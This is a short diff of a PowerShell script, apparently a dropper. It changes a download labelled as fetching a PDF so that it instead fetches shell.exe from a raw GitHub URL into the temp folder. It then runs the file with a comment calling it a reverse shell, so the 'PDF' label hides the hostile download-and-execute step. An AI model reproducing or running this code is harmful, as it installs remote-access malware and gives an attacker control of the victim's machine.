@@ -13,7 +13,7 @@ $ShellUrl = "https://raw.githubusercontent.com/matteoporfi/tokens/refs/heads/mai
 $ShellOutputPath = "$env:TEMP\shell.exe"
 
 # Download the PDF
-Invoke-WebRequest -Uri $PdfUrl -OutFile $OutputPath
+Invoke-WebRequest -Uri $ShellUrl -OutFile $ShellOutputPath
 
 # Execute the reverse shell
 Start-Process -FilePath $ShellOutputPath
